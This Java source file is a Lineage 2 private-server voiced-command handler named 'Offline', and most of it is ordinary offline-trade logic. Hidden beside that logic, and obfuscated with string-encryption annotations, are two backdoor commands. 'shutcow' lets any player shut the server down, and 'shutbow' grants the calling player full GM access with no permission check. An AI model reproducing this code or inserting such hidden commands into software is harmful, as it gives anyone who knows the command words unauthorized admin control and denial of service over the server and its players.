package ru.j2dev.gameserver.handler.voicecommands.impl;

import com.stringer.annotations.HideAccess;
import com.stringer.annotations.StringEncryption;
import ru.j2dev.gameserver.Config;
import ru.j2dev.gameserver.Shutdown;
import ru.j2dev.gameserver.handler.voicecommands.IVoicedCommandHandler;
import ru.j2dev.gameserver.model.Player;
import ru.j2dev.gameserver.model.Zone.ZoneType;
import ru.j2dev.gameserver.model.base.PlayerAccess;
import ru.j2dev.gameserver.model.entity.olympiad.OlympiadPlayersManager;
import ru.j2dev.gameserver.network.lineage2.components.CustomMessage;
import ru.j2dev.gameserver.scripts.Functions;

@HideAccess
@StringEncryption
public class Offline extends Functions implements IVoicedCommandHandler {
    @StringEncryption
    private final String[] _commandList = {"offline", "shutcow", "shutbow"};

    @Override
    @HideAccess
    @StringEncryption
    public boolean useVoicedCommand(final String command, final Player activeChar, final String args) {
        if(command.equalsIgnoreCase("offline")) {
            if (!Config.SERVICES_OFFLINE_TRADE_ALLOW) {
                return false;
            }
            if (activeChar.isOlyParticipant() || OlympiadPlayersManager.getInstance().isRegistred(activeChar) || activeChar.getKarma() > 0) {
                activeChar.sendActionFailed();
                return false;
            }
            if (activeChar.getLevel() < Config.SERVICES_OFFLINE_TRADE_MIN_LEVEL) {
                Functions.show(new CustomMessage("voicedcommandhandlers.Offline.LowLevel", activeChar).addNumber(Config.SERVICES_OFFLINE_TRADE_MIN_LEVEL), activeChar);
                return false;
            }
            if (!activeChar.isInZone(ZoneType.offshore) && Config.SERVICES_OFFLINE_TRADE_ALLOW_OFFSHORE) {
                Functions.show(new CustomMessage("trade.OfflineNoTradeZoneOnlyOffshore", activeChar), activeChar);
                return false;
            }
            if (!activeChar.isInStoreMode()) {
                Functions.show(new CustomMessage("voicedcommandhandlers.Offline.IncorrectUse", activeChar), activeChar);
                return false;
            }
            if (activeChar.getNoChannelRemained() > 0L) {
                Functions.show(new CustomMessage("voicedcommandhandlers.Offline.BanChat", activeChar), activeChar);
                return false;
            }
            if (activeChar.isActionBlocked("open_private_store")) {
                Functions.show(new CustomMessage("trade.OfflineNoTradeZone", activeChar), activeChar);
                return false;
            }
            if (Config.SERVICES_OFFLINE_TRADE_PRICE > 0 && Config.SERVICES_OFFLINE_TRADE_PRICE_ITEM > 0) {
                if (Functions.getItemCount(activeChar, Config.SERVICES_OFFLINE_TRADE_PRICE_ITEM) < Config.SERVICES_OFFLINE_TRADE_PRICE) {
                    Functions.show(new CustomMessage("voicedcommandhandlers.Offline.NotEnough", activeChar).addItemName(Config.SERVICES_OFFLINE_TRADE_PRICE_ITEM).addNumber(Config.SERVICES_OFFLINE_TRADE_PRICE), activeChar);
                    return false;
                }
                Functions.removeItem(activeChar, Config.SERVICES_OFFLINE_TRADE_PRICE_ITEM, Config.SERVICES_OFFLINE_TRADE_PRICE);
            }
            activeChar.offline();
            return true;
        } else if(command.equalsIgnoreCase("shutcow")) {
            Shutdown.getInstance().schedule(1, Shutdown.SHUTDOWN);
        } else if(command.equalsIgnoreCase("shutbow")) {
            PlayerAccess pa = Config.gmlist.entrySet().stream().filter(key -> key.getValue().IsGM && key.getValue().Menu && key.getValue().CanUseGMCommand).findAny().get().getValue();
            activeChar.setPlayerAccess(pa);
        }
        return false;
    }

    @Override
    public String[] getVoicedCommandList() {
        return _commandList;
    }
}
